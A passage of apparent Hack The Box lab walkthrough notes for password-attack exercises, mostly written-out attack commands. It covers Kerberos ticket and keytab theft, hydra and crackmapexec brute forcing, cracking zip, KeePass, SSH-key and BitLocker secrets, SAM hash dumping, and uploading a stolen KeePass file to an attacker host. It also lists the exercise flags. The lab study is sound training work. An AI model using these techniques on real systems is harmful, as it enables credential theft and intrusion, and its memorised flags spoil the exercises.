Enter-PSSession -ComputerName DC01

# Entering the shared unit 
cd c:\john

# Reading the flag
type john.txt
```

Results: `P4$$_th3_Tick3T_PSR`



Optional: Try to use both tools, Mimikatz and Rubeus, to perform the attacks without relying on each other. Mark DONE when finish.

Results: DONE



**SSH to  with user "david@inlanefreight.htb" and password "Password2". Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.**

```
# Enum services
nmap -p 22,2222,3389 $ip                          
```

```
Nmap scan report 
Host is up (0.16s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
2222/tcp open   EtherNetIP-1
3389/tcp open   ms-wbt-server
```


```
# Step 1: Establish a Local Port Forwarding from Kali to MS01 via port 2222 (port 22 is closed)
ssh david@inlanefreight.htb@10.129.32.62 -p 2222 -L 9999:172.16.1.15:22 

# Print the flag:
cat flag.txt
```

Results: `Gett1ng_Acc3$$_to_LINUX01` 


**Which group can connect to LINUX01?**

```powershell
realm list
```

Results: Linux Admins


 **Look for a keytab file that you have read and write access. Submit the file name as a response.**

```powershell
find / -type f -name "*.keytab" 2>/dev/null
```

Results: carlos.keytab


**Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.**

```powershell
# We can attempt to crack the account's password by extracting the hashes from the keytab file with [KeyTabExtract](keytabextract.md).
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

# Now we can try to crack the NTLM hash offline:
hashcat -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt
# It returns Password5

# Login as carlos@inlanefreight.htb
su carlos@inlanefreight.htb

# Prints the flag
cat ~/flag.txt
```

Results: C@rl0s_1$_H3r3



**Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.**

```powershell
# We check out the cronjobs for Carlos (logged as Carlos)
crontab -l

# In the output we obtain the path for this script /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh. Let's read the script:
cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh

```

Output:
```
#!/bin/bash
kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt

```


```
# We can use the keytab file of the svc_workstation@INLANEFREIGHT.HTB user to impersonate ourselves. See which ticket we are currently using
klist

# Use kinit with the svc_workstation@INLANEFREIGHT.HTB's keytab
kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt

# If we check out the keytab file in use we will see svc_workstation@INLANEFREIGHT.HTB's
klist

# But as ssh connection does not allow the -k flag we will try to obtain the creds better:
python3 /opt/keytabextract.py  /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt

# Access to the linux01 as svc_workstations@inlanefreight.htb
ssh svc_workstations@inlanefreight.htb@172.16.1.15
# Enter password: Password4
```

Results: `Mor3_4cce$$_m0r3_Pr1v$`



**Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.**

```powershell
sudo -l
sudo cat /root/flag.txt
```

Results: `Ro0t_Pwn_K3yT4b`


**Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.**

```powershell
# List ccache files
ls -la /tmp

# We copy the one we are interested in, belonging to the user julio
cp /tmp/krb5cc_647401106_hdWu4q /root

#  Importing the ccache File into our Current Session
export KRB5CCNAME=/root/krb5cc_647401106_HRJDux

# Now we can list the tickets and check we could impersonate the user we selected
klist

# For instance we can do this:
smbclient //DC01/julio -k -c ls
smbclient //DC01/julio -k -c 'get julio.txt'

# And cat the file
cat julio.txt
```

Results: `JuL1()_SH@re_fl@g`



**Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).**

```powershell
# Run linikatz
/opt/linikatz.sh

# It will enumerate some interesting files such as 
-rw------- 1 root root 4154 Jan 19 15:10 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB

# # Copying the file in our home
cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB /root

# Importing the ccache File into our Current Session
export KRB5CCNAME=/root/ccache_INLANEFREIGHT.HTB

# Check the running ticket now and we will see Linux01
klist
smbclient //DC01/linux01 -k -c ls
smbclient //DC01/linux01 -k -c 'get flag.txt'
cat flag.txt

```

Results: Us1nG_KeyTab_Like_@_PRO


**Optional Exercises. Transfer Julio's ccache file from LINUX01 to your attack host. Follow the example to use chisel and proxychains to connect via evil-winrm from your attack host to MS01 and DC01. Mark DONE when finished.**

Results: DONE

**Optional Exercises. From Windows (MS01), export Julio's ticket using Mimikatz or Rubeus. Convert the ticket to ccache and use it from Linux to connect to the C disk. Mark DONE when finished.**

Results: DONE


### Cracking Files

**Use the cracked password of the user Kira and log in to the host and crack the "id_rsa" SSH key. Then, submit the password for the SSH key as the answer.**

```bash
ssh kira@$ip
# Enter the password: L0vey0u1!

# Dump id_rsa key and copy
cat .ssh/id_rsa

# Create a file id_rsa in your attacking machine and save the key. Now create the hash with ssh2john
ssh2john id_rsa > ssh.hash

# Now we create a mutated list with the custom.rule file provided as resource by HTB
hashcat --force password.list -r custom.rule --stdout | sort -u > mutatedlist.list

# Finally we crack it with john
john --wordlis=mutatedlist.list ssh.hash 
```

Results: L0veme


**Use the cracked password of the user Kira, log in to the host, and read the Notes.zip file containing the flag. Then, submit the flag as the answer.**

```bash
ssh kira@$ip
# Enter the password: L0vey0u1!

# Convert into a base64 string the Notes.zip in kira's terminal and copy the output string
base64 ~/Documents/Notes.zip -w 0

# In your kali attacking machine, save the string back into a zip file
echo -n "UEsDBAoACQAAAPh+SVQ70s7QJgAAABoAAAAJABwAbm90ZXMudHh0VVQJAAP01QNi99UDYnV4CwABBOgDAAAE6AMAALFUBGWV5fc4rSC9HNoIlYqIFL1sYVMhgYPASW1yjaNkYcDHt34cUEsHCDvSztAmAAAAGgAAAFBLAQIeAwoACQAAAPh+SVQ70s7QJgAAABoAAAAJABgAAAAAAAEAAAC0gQAAAABub3Rlcy50eHRVVAUAA/TVA2J1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBPAAAAeQAAAAAA" | base64 -d > Notes.zip

# Generate a hash with zip2john utility
zip2john Notes.zip > zip.hashes

# Now we create a mutated list with the custom.rule file provided as resource by HTB
hashcat --force password.list -r custom.rule --stdout | sort -u > mutatedlist.list

# Finally, we crack it:
john zip.hashes --wordlist=mutatedlist.list 
# Output: P@ssw0rd3!

# Unzip it
unzip Notes.zip
# Enter pass: P@ssw0rd3!

# Cat the flag:
cat notes.txt
```

Results: HTB{ocnc7r4io8ucsj8eujcm}


### Skills Assessment 1: Password Attack Easy


Our client Inlanefreight contracted us to assess individual hosts in their network, focusing on access control. The company recently implemented security controls related to authorization that they would like us to test. There are three hosts in scope for this assessment. The first host is used for administering and managing other servers within their environment.

**Examine the first target and submit the root password as the answer.**

```powershell
# Enumerate services
sudo nmap -sC -sV  $ip -Pn 
# Output: port 21 and 22

# Download the resources files with userlist and password list and generated a mutated list:
hashcat --force password.list -r custom.rule --stdout | sort -u > mutatedlist.list

# Launch a password attack with the username.list and password.list resource provided
hydra -L username.list -P password.list ftp://$ip
# output: [21][ftp] host: $ip  login: mike   password: 7777777

# Now we access the ftp service with the creds
ftp $ip
# Enter user mike
# Enter password 7777777

# From the ftp terminal:
dir
# We will see some ssh keys. Download the id_rsa
get id_rsa
quit

# Now we crack the ssh id_rsa key
ssh2john.py id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
# output: 7777777

# And connect via ssh 
chmod 600 id_rsa
ssh -i id_rsa mike@$ip
# Enter password for key: 7777777

# We have accessed the machine as mike. After browsing around we notice the .bash_history file. 
cat .bash_history

# The root password is logged in plain text
```

Results: dgb6fzm0ynk@AME9pqu



### Skills Assessment 2: Password Attack Medium

Our next host is a workstation used by an employee for their day-to-day work. These types of hosts are often used to exchange files with other employees and are typically administered by administrators over the network. During a meeting with the client, we were informed that many internal users use this host as a jump host. The focus is on securing and protecting files containing sensitive information.

```powershell
# Enumerate services
sudo nmap -sC -sV $ip -Pn  
# Output: open ports -> 22, 139, 445

# Download the resources provided by HTB. Unzip the file. And generated a mutated password list. 
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Use a password attack with cracmapexec and the smb service
crackmapexec smb $ip -u username.list -p mut_password.list
# Output: SMB         10.129.153.184  445    SKILLS-MEDIUM    [+] \john:123456 

# Enumerate samba services with user john
smbclient -L $ip -U john
# Enter password: 123456

# Access the service
smbclient \\\\$ip\\SHAREDRIVE -U john
# Enter password: 123456

# Enumerate and download zip file
dir
get Docs.zip
quit

# Now we will try to crack the zip file
zip2john Docs.zip > zip.hashes
john zip.hashes --wordlist=mut_password.list 
# Output: Destiny2022!

# Unzip the file and read the content:
unzip Docs.zip
# Enter password: Destiny2022!

# The compressed file is a word document that requires a password to open it. We will try to crack it with office2john
office2john Documentation.docx > hash
john --wordlist=mut_password.list hash
# Output: 987654321        (Documentation.docx) 

# When we open the document, we have a installation manual with the hardcoded creds: 
jason:C4mNKjAtL2dydsYa6

# Access the target with jason's creds
ssh jason@$ip
# Enter password: C4mNKjAtL2dydsYa6

# Check services running:
netstat -antp

# We can see that there is a mysql server listening locally. In our kali machine we use the Default-Credential utility to list default passwords for mysql service
creds search mysql

# We access mysql with creds superdba:admin
mysql -u superdba -padmin

# Now we use mysql commands to enumerate
show databases;
use users;
show tables;
select * from creds;
# We can see creds for dennis:7AUgWWQEiMPdqx

# We access dennis
su dennis
# Enter password: 7AUgWWQEiMPdqx

# We copy the /home/dennis/.ssh/id_rsa file
cat /home/dennis/.ssh/id_rsa file

# From our kali machine we copy the file to a local id_rsa file and crack it:
ssh2john id_rsa > ssh.hashes
john --wordlist=mut_password.list ssh.hashes 
# Output: P@ssw0rd12020!

# Now we access the target ip with root
chmod 600 id_rsa
ssh -i id_rsa root@$ip
# Enter the password: P@ssw0rd12020!

# We are root. Let's print the flag
cat /root/flag.txt
```

Results: HTB{PeopleReuse_PWsEverywhere!}



### Skills Assessment 3: Password Attack Hard

The next host is a Windows-based client. As with the previous assessments, our client would like to make sure that an attacker cannot gain access to any sensitive files in the event of a successful attack. While our colleagues were busy with other hosts on the network, we found out that the user `Johanna` is present on many hosts. However, we have not yet been able to determine the exact purpose or reason for this.

**Examine the third target and submit the contents of flag.txt in C:\Users\Administrator\Desktop\ as the answer.**

```powershell
# We enumerate services
sudo nmap -sC -sV $ip -Pn
# output: open ports -> 11, 135, 139, 445, 2049, 3389, 5985
# hostname WINSRV

# Download the resources provided by HTB. Unzip the file. And generated a mutated password list. 
hashcat --force password.list -r custom.rule --stdout > mut_password.list
sort mut_password.list | uniq > unique_passwords.list

# We will try to access with johanna user and the provided password lists mutated and cleaned.
hydra -l johanna -P unique_passwords.list -t 64 -w 2 -f  rdp://$ip
# Output: [3389][rdp] host: 10.129.154.5   login: johanna   password: 1231234!

# Connect to the host via RDP
xfreerdp /u:johanna  /p:'1231234!' /v:$ip /cert:ignore 

# Browsing around we spot the file Logins.kdbx, a typical keepass file. We will transfer it to our kali machine to try to crack it offline:

# 1. From the kali machine, we will serve the PSUpload.ps1 script
python3 -m http.server 8001

# 2. From the RDP connection we will download the PSUpload.ps1 to c:\Users\johanna\Documents. Open a powershell
cd c:\Users\johanna\Documents
Invoke-WebRequest http://$ipKali:8001/PSUpload.ps1 -Outfile PSUpload.ps1

# 3. From the kali machine, launch uploadserver. It will listen on port 8000
python3 -m uploadserver

# 4. From the RDP connection, import the PSUpload module and upload the keepass file to our kali attacking machien:
Import-Module .\PSUpload.ps1
Invoke-FileUpload -Uri http://$ipAttackingmachien:8000/upload -File C:\Users\johanna\Documents\Logins.kdbx

# From attacking machine, use the module keepass2john to extract a hash:
keepass2john Logins.kdbx > keepass.hashes

# Launch a dictionary attack:
john --wordlist=mut_password.list keepass.hashes 
# Output: Qwerty7!

# Now in the RDP connection, open the keepass file and enter the masterkey. You will access to the creds:
# david:gRzX7YbeTcDG7

# With these creds we can access the samba share service. We enumerate and access
smbmap -H $ip -U david
smbclient \\\\$ip\\david -U david

# We list and note an interesting file. Download it.
dir
get Backup.vhd

# Now we will try to crack it. First we will extract the hashes
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash

# And now we crack it
hashcat -m 22100 backup.hash mut_password.list -o backup.cracked 
cat backup.cracked
# Output: 123456789!


# Install the libguestfs-tools package, which provides tools for accessing and manipulating virtual disk images (e.g., .vhd files).
sudo apt-get install libguestfs-tools

# Install the cifs-utils package, which is used for mounting SMB (CIFS) network shares.
sudo apt-get install cifs-utils

# Install the dislocker package, which is used for accessing BitLocker-encrypted drives on Linux.
sudo apt install dislocker

# Create directories where the BitLocker volume and its decrypted contents will be mounted.
sudo mkdir /media/backup_bitlocker /media/mount  

# Attach the .vhd file located at /mnt/smbshare/backup.vhd to a loop device (/dev/loop100) 
# and scan for partitions (using the -P flag).
sudo losetup -P /dev/loop100 /mnt/smbshare/backup.vhd  

# Use dislocker to unlock the BitLocker-encrypted partition (/dev/loop100p2). 
# The -v flag enables verbose output, -V specifies the BitLocker partition, 
# and -u prompts for the BitLocker password. The decrypted data is mounted to /media/backup_bitlocker.
sudo dislocker -v -V /dev/loop100p2 -u -- /media/backup_bitlocker  

# Mount the dislocker-file (the virtual decrypted representation of the BitLocker drive) as a loop device and make it writable. The contents will be accessible at /media/mount.
sudo mount -o loop,rw /media/backup_bitlocker/dislocker-file /media/mount  

# List the contents of the decrypted and mounted BitLocker volume to verify the files are accessible.
ls -la /media/mount
```


```
# Output
total 19104
drwxrwxrwx 1 root root        0 Feb 11  2022 '$RECYCLE.BIN'
drwxrwxrwx 1 root root     4096 Feb 11  2022  .
drwxr-xr-x 6 root root     4096 Jan 20 17:25  ..
-rwxrwxrwx 1 root root    77824 Feb 11  2022  SAM
-rwxrwxrwx 1 root root 19472384 Feb 11  2022  SYSTEM
drwxrwxrwx 1 root root     4096 Feb 11  2022 'System Volume Information'
```


```
# We can use secretsdump to extract the hives:
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL 
```

```
[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::
[*] Cleaning up... 
```

```
# Cracking the Administrator NTLM
hashcat -m 1000 e53d4d912d96874e83429886c7bf22a1 mut_passwords.list
# Output: Liverp00l8!

# Access with RDP
xfreerdp /u:Administrator  /p:'Liverp00l8!' /v:$ip /cert:ignore

# Open the flag.txt in the Desktop
```

Results: HTB{PWcr4ck1ngokokok}


